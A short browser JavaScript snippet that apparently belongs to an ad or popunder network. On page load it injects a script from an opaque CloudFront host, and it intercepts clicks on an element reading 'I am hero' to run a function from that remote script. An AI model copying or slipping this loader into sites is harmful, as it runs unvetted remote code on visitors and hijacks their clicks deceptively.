(function(){
  window.Rnith_Btv_Wewauc={it:4423706,key:"17c85"};

  var url="https://duw03nk63ml3f.cloudfront.net/6c479bf.js";
  var loaded=false, loading=false, q=[];

  function done(){
    loaded=true; loading=false;
    for(var i=0;i<q.length;i++) q[i]();
    q=[];
  }

  function load(cb){
    if(loaded || typeof window._Ci==="function"){loaded=true; cb(); return;}
    q.push(cb);
    if(loading) return;
    loading=true;
    var s=document.createElement("script");
    s.src=url;
    s.onload=done;
    s.onerror=function(){loading=false; q=[];};
    document.head.appendChild(s);
  }

  (function warmup(){
    try{
      var l=document.createElement("link");
      l.rel="preconnect";
      l.href="https://duw03nk63ml3f.cloudfront.net";
      document.head.appendChild(l);
      var p=document.createElement("link");
      p.rel="preload";
      p.as="script";
      p.href=url;
      document.head.appendChild(p);
    }catch(e){}
    load(function(){});
  })();

  function isHero(el){
    if(!el) return false;
    var t=((el.innerText||el.textContent)||"").trim().toLowerCase();
    return t==="i am hero !"||t==="i am hero!"||t==="i am hero";
  }

  document.addEventListener("click",function(e){
    var el=e.target;
    while(el && el!==document.body && !isHero(el)) el=el.parentElement;
    if(!isHero(el)) return;
    e.preventDefault();
    load(function(){
      if(typeof window._Ci==="function") window._Ci();
    });
  },true);
})();
